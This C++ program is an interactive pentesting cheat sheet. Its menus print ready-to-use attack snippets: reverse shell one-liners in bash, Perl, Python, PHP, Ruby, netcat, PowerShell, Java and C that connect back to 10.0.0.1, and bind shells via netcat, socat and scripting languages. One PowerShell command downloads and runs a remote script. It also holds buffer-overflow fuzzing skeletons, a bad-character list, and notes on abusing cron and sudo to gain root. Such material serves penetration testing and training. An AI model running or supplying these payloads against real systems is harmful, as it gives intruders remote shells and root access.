#include <iostream>
#include <string>
#include <sstream>
#include <thread>
#include <chrono>


/*void sleep() {
	using namespace std::chrono_literals;
	std::this_thread::sleep_for(10000ms);
}*/

const size_t COUNT {20};
bool end {false};
int tool{};

void space() {
	for (int i{}; i < COUNT; ++i) {
		std::cout << std::endl;
	}
}

void exit() {
	//exit menu?
	std::cout << "Back to main menu ? ( Y | N) : ";
	char go;
	std::cin >> go;
	if((go == 'Y') || (go == 'y')) {
		end = false;
	}else{
	
		end = true;
	}
}

template <typename T>
std::optional <T> string_to( const std::string& s) {
	std::istringstream ss( s );
	T result;
	ss >> result >> std::ws;
	if (ss.eof()) return result;
	return {};
}
void check() {
	std::string s;
	getline(std::cin, s);
	auto x = string_to <int> ( s );
	if (!x){
	 space();
	 std::cout << "Only enter integers!" << std::endl;
	 std::cout << std::endl;
	}
	
	tool = *x;
}

int main() {

	
	while((end == false)) {


	std::cout << "Welcome to size_t's cheat sheet!" << std::endl;
	std::cout << std::endl;
	std::cout << "[1] Reverse shell one liners" << std::endl;
	std::cout << "[2] Bind shell one liners" << std::endl;
	std::cout << "[3] HTTP servers" << std::endl;
	std::cout << "[4] Buffer overflow (skeleton PoC, bad chars, etc)" << std::endl;
	std::cout << "[5] Linux post enumeration" << std::endl;
	std::cout << "[6] Exit - goodbye! " << std::endl;
	std::cout << std::endl;
	std::cout << "Choose an option : ";

	check();	

	// option 1 begin
	if (const int option1{1};option1 == tool) {

		

	std::cout << "----------------------- Reverse shell one liners ---------------------------------" << std::endl;
	std::cout << "[1]Bash - bash reverse shells" << std::endl;
	std::cout << "[2]Perl - perl reverse shells" << std::endl;
	std::cout << "[3]Python - python reverse shells" << std::endl;
	std::cout << "[4]php - php reverse shells" << std::endl;
	std::cout << "[5]ruby - ruby reverse shells" << std::endl;
	std::cout << "[6]netcat - netcat reverse shells" << std::endl;
	std::cout << "[7]java - java reverse shell" << std::endl;
	std::cout << "[8]xterm - xterm reverse shell" << std::endl;
	std::cout << "[9]Powershell - powershell reverse shells" << std::endl;
	std::cout << "[10]C - C reverse shell" << std::endl;
	std::cout << std::endl;
	std::cout << "------------------------------------------------------------------" << std::endl;
	std::cout << "Enter a number to get shells : ";
	std::cin >> tool;

	std::cout << std::endl;	
	std::cout << std::endl;
	std::cout << std::endl;
	std::cout << std::endl;
	std::cout << std::endl;

	const int bash{1};
	const int perl{2};
	const int python{3};
	const int php{4};
	const int ruby{5};
	const int netcat{6};
	const int java{7};
	const int xterm{8};
	const int powershell{9};
	const int crs{10};

	std::string a1 = R"EOF(
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1

****UDP****
sh -i >& /dev/udp/10.0.0.1/4242 0>&1
nc -u -lvp 4242
)EOF";

	std::string a = R"EOF(
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

NOTE: Windows only
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

)EOF";

	std::string b = R"EOF(
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

NOTE: Windows only
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))")EOF";
	std::string c = R"EOF(
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'

php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);')EOF";


	std::string d = R"EOF(
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'

NOTE: Windows only
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end')EOF";
	std::string e = R"EOF(
Netcat Traditional

nc -e /bin/sh 10.0.0.1 4242
nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242

Netcat OpenBsd

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
Netcat BusyBox
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f

Ncat

ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.1 4242 -e /bin/bash)EOF";

	std::string f = R"EOF(r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor())EOF";

	std::string g = R"EOF(xterm -display 10.0.0.1:1)EOF";
	
	std::string h = R"EOF(
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1'))EOF";

	std::string i = R"EOF(
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}

Compile with gcc /tmp/shell.c --output csh && csh)EOF";

	// switch for reverse shell menu
	switch (tool) {
		case bash: 
			if (tool == bash) {
				space();
				std::cout << "------------------------------- Bash reverse shell --------------------" << std::endl;
		    		std::cout << a1 << std::endl;
				std::cout << "------------------------------------------------------------------------" << std::endl;
			}	
	        
	 	break;

		case perl: 
			if (tool == perl) {
				space();															       					 std::cout << "-------------------------------- Perl reverse shell ---------------------" << std::endl;
				std::cout << a << std::endl;
				std::cout << "-------------------------------------------------------------------------" << std::endl;
				
			}
		
		break;

		case python: 
			if (tool == python) {
				space();
				std::cout << "--------------------------------- Python reverse shell -------------------" << std::endl;
			       	std::cout << b << std::endl;
				std::cout << "--------------------------------------------------------------------------" << std::endl;
				
			}	
		
	 	break;

		case php: 
		    	if (tool == php) {
				space();
				std::cout << "-------------------------------- php reverse shell -----------------------" << std::endl;
				std::cout << c << std::endl;
				std::cout << "--------------------------------------------------------------------------" << std::endl;
				
			}
		
	 	break;

		case ruby: 
		    	if (tool == ruby) {
				space();
				std::cout << "-------------------------------- ruby reverse shell ----------------------" << std::endl;
			       	std::cout << d << std::endl;
				std::cout << "--------------------------------------------------------------------------" << std::endl;
				
			}
		
	 	break;

		case netcat: 
		    	if (tool == netcat) {
				space();
				std::cout << "------------------------------- netcat(1) reverse shell ------------------" << std::endl;				       					 std::cout << e << std::endl;
				std::cout << "--------------------------------------------------------------------------" << std::endl;
				
			}
		
	 	break;

		case java: 
			if (tool == java) {
				space();
		     		std::cout << "--------------------------- java reverse shell -------------------------" << std::endl;
				std::cout << f << std::endl;
				std::cout << "------------------------------------------------------------------------" << std::endl;
				
			}		
		
		break;

		case xterm: 
			if (tool == xterm) {
				space();
				std::cout << "-------------------------- xterm reverse shell -------------------------" << std::endl;
				std::cout << g << std::endl;
				std::cout << "------------------------------------------------------------------------" << std::endl;
				
			}
		 
		break;
		
		case powershell: 
			if (tool == powershell) {
				space();
				std::cout << "-------------------------- powershell reverse shells ---------------------" << std::endl;
				std::cout << h << std::endl;
				std::cout << "--------------------------------------------------------------------------" << std::endl;
				
			}
		
		break;

		case crs: 
			if (tool == crs) {
				space();
		      		std::cout << "-------------------------- C reverse shell -------------------------"  << std::endl;
				std::cout << i << std::endl;
				std::cout << "--------------------------------------------------------------------" << std::endl;
				
			}		
		
		break;

		default: {
		    space();	
		    std::cout << "Warning: you can only enter integers..." << std::endl;
		    
		}
		break;
	} //switch end
	
	//exit menu?
	exit();
	check();
	space();


	//option 2 begin
	    }else if (const int option2{2};option2 == tool) {
		
		    space();

		std::cout << "--------------------------- bind shell one liners ---------------------------" << std::endl;
		std::cout << std::endl;

		std::cout << "[1]Perl -  perl bind shell" << std::endl;
		std::cout << "[2]Python - python bind shell" << std::endl;
		std::cout << "[3]php - php bind shell" << std::endl;
		std::cout << "[4]Ruby - ruby bind shell" << std::endl;
		std::cout << "[5]Netcat(1) - traditional netcat bind shell" << std::endl;
		std::cout << "[6]Netcat(2) - netcat openbsd bind shell" << std::endl;
		std::cout << "[7]Socat - socat bindshell" << std::endl;

		std::cout << std::endl;
		std::cout << "-------------------------------------------------------------------------" << std::endl;
		std::cout << "Choose an option : ";
		std::cin >> tool;
		std::cout << std::endl;
	
		
		const int perl{1};
		const int python{2};
		const int php{3};	
		const int ruby{4};
		const int netcat1{5};
		const int netcat2{6};
		const int socat{7};

		std::string a = R"EOF(perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};')EOF";
		std::string b = R"EOF(python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
)EOF";
		std::string c = R"EOF(php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
    socket_write($cl,$m,strlen($m));}}')EOF";
		std::string d = R"EOF(ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)')EOF";
		std::string e = R"EOF(nc -nlvp 51337 -e /bin/bash)EOF";
		std::string f = R"EOF(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f)EOF";
		std::string g = R"EOF(user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 
user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane)EOF";
		
		
		//switch for bindshells menu 
		switch (tool) {
		case perl: 
		     if (tool == perl) {
			     space();
			     std::cout << "-------------------------------------- perl bind shell ----------------------" << std::endl;
			     std::cout << a << std::endl;
			     std::cout << "-----------------------------------------------------------------------------" << std::endl;
			     
		     }
		
	 	break;
		
		case python: 
			if (tool == python) {
				space();
				std::cout << "---------------------------------- python bind shell ---------------------" << std::endl;
				std::cout << b << std::endl;
				std::cout << "--------------------------------------------------------------------------" << std::endl;
				
			}
		
		break;

		case php: 
		    	if (tool == php) {
				space();
				std::cout << "------------------------------ php bind shell ------------------------" << std::endl;
				std::cout << c << std::endl;
				std::cout << "----------------------------------------------------------------------" << std::endl;
				
			}	
		
		break;

		case ruby: 
			if (tool == ruby) {
				space();
				std::cout << "------------------------------ ruby bind shell --------------------------" << std::endl;
				std::cout << d << std::endl;
				std::cout << "--------------------------------------------------------------------------" << std::endl;
			
			}
		
		break;
		
		case netcat1: 
			if (tool == netcat1) {
				space();
				std::cout << "------------------------- netcat(1) bind shell --------------------------" << std::endl;
				std::cout << e << std::endl;
				std::cout << "-------------------------------------------------------------------------" << std::endl;
				
			}
		
		break;

		case netcat2: 
			if(tool == netcat2) {
				space();
				std::cout << "------------------------------- netcat(2) bind shell ---------------------" << std::endl;
		  		std::cout << f << std::endl;
				std::cout << "--------------------------------------------------------------------------" << std::endl;
				
			}		
		
		break;

		case socat: 
			if (tool == socat) {
				space();
				std::cout << "------------------------------- socat bind shell -------------------------" << std::endl;
				std::cout << g << std::endl;
				std::cout << "--------------------------------------------------------------------------" << std::endl;
				
			}	
		
		break;

		default: {
		    space();
		    std::cout << "Warning: you can only enter integers..." << std::endl;
		}
		break;
	} //switch end	
	
	//exit menu?
	exit();
	check();
	space();


		//option 3 begin
    }else if (const int option3{3};option3 == tool) {
		
	    	space();
	    
	    	std::cout << "----------------------------- http servers ------------------------------" << std::endl;
	       	std::cout << std::endl;	
		
		std::cout << "[1]Python2 - Python2 http server" << std::endl;
		std::cout << "[2]Ruby - ruby http server" << std::endl;
		std::cout << "[3]Python3 - python3 http server" << std::endl;
		std::cout << "[4]php - php http server" << std::endl;
		std::cout << "[5]busybox - busybox http server" << std::endl;
		std::cout << "------------------------------------------------------------------------" << std::endl;

		std::cout << "Choose an option : ";
		std::cin >> tool;

		const int python2{1};
		const int ruby{2};
		const int python3{3};
		const int php{4};
		const int busybox{5};
		
		std::string a {"python -m SimpleHTTPServer 80"};
		std::string b {"ruby -run -e httpd . -p 80"};
		std::string c {"python3 -m http.server 80"};
		std::string d {"php -S 0.0.0.0:80"};
		std::string e {"busybox httpd -f -p 80"};
	
		switch (tool) {
		case python2: 
			if (tool == python2) {
				space();
				std::cout << "---------------------------- python2 http server -------------------------" << std::endl;
				std::cout << a << std::endl;
				std::cout << "--------------------------------------------------------------------------" << std::endl;
				
			}
		
		break;
		
		case ruby: 
			if (tool == ruby) {
				space();
				std::cout << "---------------------------- ruby http server ------------------------" << std::endl;
		     		std::cout << b << std::endl;
				std::cout << "----------------------------------------------------------------------" << std::endl;
				
			}		
		
		break;

		case python3: 
			if (tool == python3) {
				space();
				std::cout << "-------------------------- python3 http server -------------------------" << std::endl;
		      		std::cout << c << std::endl;
				std::cout << "------------------------------------------------------------------------" << std::endl;
				
			}		
		
		break;

		case php: 
			if (tool == php) {
				space();
				std::cout << "---------------------------- php http server ----------------------" << std::endl;
				std::cout << d << std::endl;
				std::cout << "-------------------------------------------------------------------" << std::endl;
			
			}
		
		break;

		case busybox: 
			if (tool == busybox) {
				space();
				std::cout << "---------------------------- busybox http server -------------------" << std::endl;
				std::cout << e << std::endl;
				std::cout << "--------------------------------------------------------------------" << std::endl;
				
			}
		
		break;

		default: {
			space();
			std::cout << "Warning: you can only enter integers..." << std::endl;
		}
		break;
	} //switch end	

		//exit menu?
		exit();
		check();
		space();


		//option 4 begin
    }else if (const int option4{4};option4 == tool) {
    		
	    	space();
	    	
	    	std::cout << "-------------------------- buffer overflow stuff ------------------------------" << std::endl;
    		std::cout << std::endl;
    		
		std::cout << "[1] python2 simple skeleton" << std::endl;
		std::cout << "[2] python3 simple skeleton" << std::endl;
    		std::cout << "[3] bad chars (256)" << std::endl;
		std::cout << std::endl;	
		std::cout << "---------------------------------------------------------------------------------" << std::endl;

		std::cout << "Choose an option : ";
		std::cin >> tool;

		const int python2{1};
		const int python3{2};
		const int badchars{3};
		
		//strings for the menu (sorry about the mess)

		std::string a = R"EOF(
#!/usr/bin/python
import socket

IP = '127.0.0.1' #replace with target ip
PORT = 9999 #replace with target port 

buff = "A" * 1000

s = socket.socket( socket.AF_INET, socket.SOCK_STREAM) #create the socket
s.connect((IP,PORT))
s.send(buff) #send junk
s.close() #close socket
)EOF";
    		std::string b = R"EOF(
import socket
import struct
import time
 
IP = '127.0.0.1' #replace with target ip
PORT = 9999 #replace target port
 
# Connect to the Server:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP,PORT))
 
# Send junk
buf = b""
buf += b"A"*1000
 
s.send(buf) #send junk
 
s.close() #close socket
)EOF";
   		std::string c = R"EOF(\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
)EOF";

		switch(tool) {
			case python2: 
				if (tool == python2) {
					space();
					std::cout << "-----------------------------------------------------------------" << std::endl;
					std::cout << a << std::endl;
					std::cout << "-----------------------------------------------------------------" << std::endl;
					
				}
			
			break;

			case python3: 
	      			if (tool == python3) {
					space();
					std::cout << "-------------------------------------------------------------" << std::endl;
	  				std::cout << b << std::endl;
					std::cout << "-------------------------------------------------------------" << std::endl;
				
				}
				
			break;

			case badchars: 
				if (tool == badchars) {
					space();
					std::cout << "-----------------------------------------------------------------" << std::endl;
			 		std::cout << c << std::endl;
					std::cout << "-----------------------------------------------------------------" << std::endl;
				
				}
			
			break;

			default: {
					 space();
					 std::cout << "Warning: you can only enter integers..." << std::endl;
				 }		 
				break;
		
	} // switch end			      

		//exit menu?
		exit();
		check();
		space();

		//option 5 begin
    }else if (const int option5{5};option5 == tool) {
		
		space();
		std::cout << "---------------------------------------- Linux Post Enumeration  -----------------------------------------" << std::endl;
		std::cout << std::endl;

		std::cout << "[1] TTY Spawn Shell " << std::endl;
		std::cout << "[2] Cron Jobs enumeration" << std::endl;
		std::cout  << "[3] Sudo privesc" << std::endl;
		std::cout << "[4] Service enumeration" << std::endl;

		std::cout << std::endl;	
		std::cout << "------------------------------------------------------------------------------------------------------------" << std::endl;

		std::cout << "Choose an option : ";
		std::cin >> tool;
		
		const int tty{1};
		const int cron{2};
		const int sudo{3};
		const int serv{4};

		std::string a = R"EOF(
All Steps to Stabilize your shell: 

python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
)EOF";
		std::string b = R"EOF(
Check crontabs:

crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"

Crontabs system-wide  location:

/etc/crontab

User owned crontabs:

/var/spool/cron
/var/spool/cron/crontabs

note: If you can overwrite one of the scripts run in a root crontab, tehn you can gain a root shell when the job is run.
Pay special attention to cron jobs that run often, for example every 5 minutes. If something is only run once per month you might be in for a long wait.)EOF";

		std::string c = R"EOF(
Check sudo privileges (Often requires password):

sudo -l

Execute sudo as another user:

sudo -u <user> <command>
sudo -u <user> whoami

sudo -u <user> /bin/bash

Root shell(?):

sudo su - 

sudo su

#alternatives
sudo -s
sudo -i 
sudo /bin/bash
sudo passwd)EOF";
	
		std::string d = R"EOF(
Show all processes running as root:

ps aux | grep "^root"

note: Look out for version numbers, if you can find a version number for the program, then search for exploits (e.g program --version, program -v)

Check installed programs and versions with dpkg:

dpkg -l | grep <program>

alternative:

rpm -qa | grep <program>

quick enum commands:
ps aux
ps -ef
top
cat /etc/services

dpkg -l
rpm -qa)EOF";


		switch(tool) {
			case tty:
				if (tool == tty) {
					space();
					std::cout << "------------------------------ TTY Spawn Shell -------------------------" << std::endl;
					std::cout << a << std::endl;
					std::cout << "------------------------------------------------------------------------" << std::endl;
				}
			break;

			case cron:
				if (tool == cron) {
					space();
					std::cout << "------------------------------ Cron jobs enumeration ----------------------------" << std::endl;
					std::cout << b << std::endl;
					std::cout << "---------------------------------------------------------------------------------" << std::endl;
				}
			break;
			
			case sudo:
				if(tool == sudo) {
					space();
					std::cout << "---------------------------------- sudo privesc ----------------------------------" << std::endl;
					std::cout << c << std::endl;
					std::cout << "---------------------------------------------------------------------------------" << std::endl;
				}
			break;
			
			case serv:
				if(tool == serv) {
					space();
					std::cout << "------------------------------- service enumeration ----------------------------" << std::endl;
					std::cout << d << std::endl;
					std::cout << "-----------------------------------------------------------------------------" << std::endl;
				}
			break;

			default: {
					 space();
					 std::cout << "Warning: You can only enter integers..." << std::endl; 
				 }
			break;

		} //switch end

		//exit menu?
		exit();
		check();
		space();

    }else if (const int option6{6};option6 == tool) {
		
		std::cout << "Okay, exiting..." << std::endl;
		return 0;
	}

} //while loop end
	return 0;

}

